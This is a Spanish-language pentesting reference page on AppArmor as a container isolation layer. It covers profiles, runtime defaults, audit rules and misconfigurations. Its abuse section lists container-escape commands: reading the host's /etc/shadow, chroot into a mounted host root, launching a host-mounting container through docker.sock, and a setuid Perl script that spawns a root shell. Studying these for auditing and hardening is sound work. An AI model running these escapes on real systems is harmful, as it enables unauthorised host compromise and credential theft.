# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Descripción general

AppArmor es un sistema de **Control de Acceso Obligatorio** que aplica restricciones mediante perfiles por programa. A diferencia de las comprobaciones DAC tradicionales, que dependen en gran medida de la propiedad de usuarios y grupos, AppArmor permite que el kernel aplique una política asociada al propio proceso. En entornos de contenedores, esto es importante porque una carga de trabajo puede tener suficientes privilegios tradicionales para intentar una acción y, aun así, ser denegada porque su perfil de AppArmor no permite la ruta, el montaje, el comportamiento de red o el uso de capacidades pertinentes.

El punto conceptual más importante es que AppArmor está **basado en rutas**. Evalúa el acceso al sistema de archivos mediante reglas de rutas, en lugar de etiquetas como hace SELinux. Esto lo hace accesible y potente, pero también significa que los bind mounts y las disposiciones alternativas de rutas requieren atención cuidadosa. Si el mismo contenido del host queda accesible mediante una ruta diferente, el efecto de la política podría no ser el que el operador esperaba inicialmente.

## Función en el aislamiento de contenedores

Las revisiones de seguridad de contenedores suelen detenerse en las capabilities y seccomp, pero AppArmor sigue siendo importante después de esas comprobaciones. Imagina un contenedor con más privilegios de los debidos, o una carga de trabajo que necesitaba una capability adicional por motivos operativos. AppArmor aún puede restringir el acceso a archivos, el comportamiento de los montajes, las redes y los patrones de ejecución de maneras que detengan la vía de abuso más evidente. Por eso, desactivar AppArmor «solo para que la aplicación funcione» puede convertir silenciosamente una configuración meramente arriesgada en una que es activamente explotable.

## Laboratorio

Para comprobar si AppArmor está activo en el host, usa:

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

Para ver bajo qué usuario se está ejecutando el proceso actual del contenedor:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

La diferencia es instructiva. En el caso normal, el proceso debería mostrar un contexto de AppArmor asociado al perfil elegido por el runtime. En el caso sin confinamiento, esa capa adicional de restricciones desaparece.

También puedes inspeccionar lo que Docker cree que ha aplicado:

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## Uso en tiempo de ejecución

Docker puede aplicar un perfil AppArmor predeterminado o personalizado cuando el host lo admite. Podman también puede integrarse con AppArmor en sistemas basados en AppArmor, aunque en las distribuciones que priorizan SELinux suele predominar el otro sistema MAC. Kubernetes puede exponer políticas de AppArmor en el nivel de la carga de trabajo en los nodos que realmente admiten AppArmor. LXC y otros entornos de contenedores de sistema de la familia Ubuntu también usan AppArmor ampliamente.

El punto práctico es que AppArmor no es una «función de Docker». Es una función del kernel del host que varios runtimes pueden optar por aplicar. Si el host no lo admite o se indica al runtime que se ejecute sin restricciones, la supuesta protección no está realmente presente.

En Kubernetes, específicamente, la API moderna es `securityContext.appArmorProfile`. Desde Kubernetes `v1.30`, las anotaciones beta antiguas de AppArmor están obsoletas. En los hosts compatibles, `RuntimeDefault` es el perfil predeterminado, mientras que `Localhost` apunta a un perfil que ya debe estar cargado en el nodo. Esto importa durante la revisión, porque un manifiesto puede parecer compatible con AppArmor y, aun así, depender por completo de la compatibilidad del nodo y de los perfiles precargados.<sup>[[1]](#references)</sup>

Un detalle operativo sutil, pero útil, es que establecer explícitamente `appArmorProfile.type: RuntimeDefault` es más estricto que simplemente omitir el campo. Si el campo se establece explícitamente y el nodo no admite AppArmor, la admisión debería fallar. Si se omite el campo, la carga de trabajo aún podría ejecutarse en un nodo sin AppArmor, simplemente sin recibir esa capa adicional de confinamiento. Desde el punto de vista de un atacante, esta es una buena razón para comprobar tanto el manifiesto como el estado real del nodo.<sup>[[1]](#references)</sup>

En los hosts con Docker que admiten AppArmor, el perfil predeterminado más conocido es `docker-default`. Ese perfil se genera a partir de la plantilla AppArmor de Moby y es importante porque explica por qué algunos PoC basados en capacidades siguen fallando en un contenedor predeterminado. En términos generales, `docker-default` permite la conexión en red habitual, deniega escrituras en gran parte de `/proc`, deniega el acceso a partes sensibles de `/sys`, bloquea las operaciones de montaje y restringe ptrace para que no sea una herramienta general de sondeo del host. Comprender esa configuración de referencia ayuda a distinguir entre «el contenedor tiene `CAP_SYS_ADMIN`» y «el contenedor realmente puede usar esa capacidad contra las interfaces del kernel que me interesan».

## Gestión de perfiles

Los perfiles de AppArmor suelen almacenarse en `/etc/apparmor.d/`. Una convención de nomenclatura común consiste en sustituir las barras de la ruta del ejecutable por puntos. Por ejemplo, un perfil para `/usr/bin/man` suele almacenarse como `/etc/apparmor.d/usr.bin.man`. Este detalle importa tanto en la defensa como en la evaluación, porque una vez que conoces el nombre del perfil activo, a menudo puedes localizar rápidamente el archivo correspondiente en el host.

Entre los comandos útiles de gestión en el host se incluyen:

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

La razón por la que estos comandos son importantes en una referencia sobre seguridad de contenedores es que explican cómo se crean y cargan los perfiles, cómo se cambian al modo complain y cómo se modifican después de actualizar una aplicación. Si un operador suele cambiar los perfiles al modo complain durante la resolución de problemas y olvida volver a activar la aplicación de restricciones, el contenedor puede parecer protegido en la documentación, aunque en realidad se comporte de forma mucho más permisiva.

### Construcción y actualización de perfiles

`aa-genprof` puede observar el comportamiento de una aplicación y ayudar a generar un perfil de forma interactiva:

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof` puede generar un perfil de plantilla que posteriormente puede cargarse con `apparmor_parser`:

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

Cuando cambia el binario y es necesario actualizar la política, `aa-logprof` puede reproducir las denegaciones encontradas en los registros y ayudar al operador a decidir si las permite o las deniega:

```bash
sudo aa-logprof
```

### Registros

Las denegaciones de AppArmor suelen ser visibles mediante `auditd`, `syslog` o herramientas como `aa-notify`:

```bash
sudo aa-notify -s 1 -v
```

Esto es útil desde el punto de vista operativo y ofensivo. Los defensores lo usan para perfeccionar perfiles. Los atacantes lo usan para averiguar qué ruta u operación exacta se está denegando y si AppArmor es el control que está bloqueando una cadena de explotación.

### Identificar el archivo de perfil exacto

Cuando un runtime muestra un nombre de perfil de AppArmor específico para un contenedor, suele ser útil asociar ese nombre con el archivo de perfil en el disco:

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

Esto resulta especialmente útil durante una revisión desde el host, ya que salva la brecha entre «el contenedor indica que se ejecuta con el perfil `lowpriv`» y «las reglas reales están en este archivo específico, que se puede auditar o volver a cargar».

### Reglas clave que auditar

Cuando puedas leer un perfil, no te limites a las líneas `deny`. Varios tipos de reglas cambian sustancialmente la eficacia de AppArmor frente a un intento de escape de contenedor:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: ejecuta el binario de destino sin restricciones. Si se permite ejecutar con `ux` un helper, shell o intérprete accesible, suele ser lo primero que conviene probar.
- `px` / `Px` y `cx` / `Cx`: realizan transiciones de perfil al ejecutar. No son automáticamente peligrosos, pero conviene auditarlos, porque una transición puede llevar a un perfil mucho más permisivo que el actual.
- `change_profile`: permite que una tarea cambie a otro perfil cargado, de inmediato o en la siguiente ejecución. Si el perfil de destino es más débil, puede convertirse en la vía de escape prevista para salir de un dominio restrictivo.
- `flags=(complain)`, `flags=(unconfined)` o el más reciente `flags=(prompt)`: deberían influir en cuánta confianza depositas en el perfil. `complain` registra las denegaciones en lugar de aplicarlas, `unconfined` elimina el límite y `prompt` depende de una decisión en el espacio de usuario, en vez de una denegación aplicada exclusivamente por el kernel.
- `userns` o `userns create,`: las políticas más recientes de AppArmor pueden controlar la creación de user namespaces. Si un perfil de contenedor lo permite explícitamente, los user namespaces anidados siguen siendo posibles, incluso cuando la plataforma usa AppArmor como parte de su estrategia de hardening.

Comando `grep` útil desde el host:

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Este tipo de auditoría suele ser más útil que revisar cientos de reglas de archivos comunes. Si un breakout depende de ejecutar un helper, entrar en un nuevo namespace o escapar a un perfil menos restrictivo, la respuesta suele estar oculta en estas reglas orientadas a las transiciones, y no en las líneas obvias de estilo `deny /etc/shadow r`.

## Misconfigurations

El error más obvio es `apparmor=unconfined`. Los administradores suelen configurarlo al depurar una aplicación que falló porque el perfil bloqueó correctamente algo peligroso o inesperado. Si la flag permanece en producción, la capa MAC se habrá eliminado de hecho.

Otro problema sutil es suponer que los bind mounts son inofensivos porque los permisos de archivo parecen normales. Como AppArmor se basa en rutas, exponer rutas del host en ubicaciones de montaje alternativas puede interactuar mal con las reglas de rutas. Un tercer error es olvidar que un nombre de perfil en un archivo de configuración significa muy poco si el kernel del host no está aplicando realmente AppArmor.

## Abuse

Cuando AppArmor desaparece, las operaciones que antes estaban restringidas pueden funcionar de repente: leer rutas sensibles a través de bind mounts, acceder a partes de procfs o sysfs cuyo uso debería haber sido más difícil, realizar acciones relacionadas con mount si las capabilities/seccomp también lo permiten, o usar rutas que un perfil normalmente denegaría. AppArmor suele ser el mecanismo que explica por qué un intento de breakout basado en capabilities «debería funcionar» en teoría, pero aun así falla en la práctica. Elimina AppArmor y el mismo intento podría empezar a funcionar.

Si sospechas que AppArmor es lo que principalmente impide una cadena de abuso basada en path-traversal, bind mounts o mount, el primer paso suele ser comparar qué se vuelve accesible con y sin un perfil. Por ejemplo, si una ruta del host está montada dentro del contenedor, empieza por comprobar si puedes recorrerla y leerla:

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

Si el contenedor también tiene una capability peligrosa como `CAP_SYS_ADMIN`, una de las pruebas más prácticas consiste en comprobar si AppArmor es el control que bloquea las operaciones `mount` o el acceso a sistemas de archivos sensibles del kernel:

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

En entornos donde ya se puede acceder a una ruta del host mediante un bind mount, perder AppArmor también puede convertir un problema de divulgación de información de solo lectura en acceso directo a archivos del host:

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

El objetivo de estos comandos no es que AppArmor por sí solo provoque la salida del contenedor. Es que, una vez eliminado AppArmor, muchas vías de abuso del sistema de archivos y basadas en montajes se pueden probar de inmediato.

### Ejemplo completo: AppArmor desactivado + raíz del host montada

Si el contenedor ya tiene la raíz del host montada mediante bind en `/host`, eliminar AppArmor puede convertir una vía de abuso del sistema de archivos bloqueada en una salida completa del host:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

Una vez que la shell se ejecuta a través del sistema de archivos del host, la carga de trabajo ha escapado efectivamente de los límites del contenedor:

```bash
id
hostname
cat /etc/shadow | head
```

### Ejemplo completo: AppArmor deshabilitado + socket del runtime

Si la barrera real era AppArmor alrededor del estado del runtime, un socket montado puede bastar para escapar por completo:

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

La ruta exacta depende del punto de montaje, pero el resultado es el mismo: AppArmor ya no impide el acceso a la API del runtime, y esta puede iniciar un contenedor que comprometa el host.

### Ejemplo completo: bypass de bind-mount basado en rutas

Como AppArmor se basa en rutas, proteger `/proc/**` no protege automáticamente el mismo contenido de procfs del host cuando se puede acceder a él mediante otra ruta:

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

El impacto depende de qué se haya montado exactamente y de si la ruta alternativa también elude otros controles, pero este patrón es una de las razones más claras por las que AppArmor debe evaluarse junto con la configuración de montajes, y no de forma aislada.

### Ejemplo completo: Shebang Bypass

AppArmor puede asociar un perfil a la ruta del script ejecutado, en lugar de al intérprete indicado en su shebang. A la inversa, invocar directamente el intérprete puede seleccionar el perfil de este. Un [mantenedor de AppArmor describe esta distinción](https://bugs.launchpad.net/apparmor/+bug/1911431). Un ejemplo histórico involucraba un script cuya primera línea apunta a un intérprete confinado:

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

El ejemplo es solo un caso posible en el que la capacidad de archivo del intérprete puede hacerse efectiva y el perfil de ejecución real del script permite la operación. Comprueba la política cargada y la etiqueta del proceso, el conjunto de capacidades permitidas, `no_new_privs` y el estado `nosuid` del montaje; el nombre de un archivo de perfil o una entrada `cap_setuid+ep` por sí solos no demuestran que se pueda realizar una transición. Las cadenas de intérpretes y las rutas de ejecución alternativas merecen una revisión aparte.

## Comprobaciones

El objetivo de estas comprobaciones es responder rápidamente a tres preguntas: ¿AppArmor está habilitado en el host?, ¿el proceso actual está confinado? y ¿el entorno de ejecución aplicó realmente un perfil a este contenedor?

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Qué resulta interesante aquí:

- Si `/proc/self/attr/current` muestra `unconfined`, la carga de trabajo no está beneficiándose del confinamiento de AppArmor.
- Si `aa-status` muestra que AppArmor está deshabilitado o no está cargado, cualquier nombre de perfil en la configuración del runtime es en gran medida cosmético.
- Si `docker inspect` muestra `unconfined` o un perfil personalizado inesperado, a menudo esa es la razón por la que funciona una vía de abuso basada en el sistema de archivos o en los mounts.
- Si `/sys/kernel/security/apparmor/profiles` no contiene el perfil esperado, la configuración del runtime o del orquestador no basta por sí sola.
- Si un perfil supuestamente reforzado contiene reglas del tipo `ux`, `change_profile` amplio, `userns` o `flags=(complain)`, el límite práctico puede ser mucho más débil de lo que sugiere el nombre del perfil.

Si un contenedor ya tiene privilegios elevados por motivos operativos, mantener AppArmor habilitado suele marcar la diferencia entre una excepción controlada y un fallo de seguridad mucho más amplio.

## Valores predeterminados del runtime

| Runtime / plataforma | Estado predeterminado | Comportamiento predeterminado | Debilitamiento manual habitual |
| --- | --- | --- | --- |
| Docker Engine | Habilitado de forma predeterminada en hosts compatibles con AppArmor | Usa el perfil de AppArmor `docker-default` salvo que se indique otro | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Depende del host | AppArmor es compatible mediante `--security-opt`, pero el valor predeterminado exacto depende del host y del runtime, y es menos universal que el perfil `docker-default` documentado de Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Predeterminado condicional | Si no se especifica `appArmorProfile.type`, el valor predeterminado es `RuntimeDefault`, pero solo se aplica cuando AppArmor está habilitado en el nodo | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` con un perfil débil, nodos sin compatibilidad con AppArmor |
| containerd / CRI-O bajo Kubernetes | Depende de la compatibilidad del nodo y del runtime | Los runtimes habituales compatibles con Kubernetes admiten AppArmor, pero la aplicación efectiva sigue dependiendo de la compatibilidad del nodo y de la configuración de la carga de trabajo | Igual que en la fila de Kubernetes; la configuración directa del runtime también puede omitir AppArmor por completo |

Para AppArmor, la variable más importante suele ser el **host**, no solo el runtime. Una configuración de perfil en un manifiesto no crea confinamiento en un nodo donde AppArmor no está habilitado.

## References

- [1] [Contexto de seguridad de Kubernetes: campos del perfil de AppArmor y comportamiento según la compatibilidad del nodo](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Página de manual de `apparmor.d(5)` de Ubuntu 24.04: transiciones de ejecución, `change_profile`, `userns` y flags del perfil](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
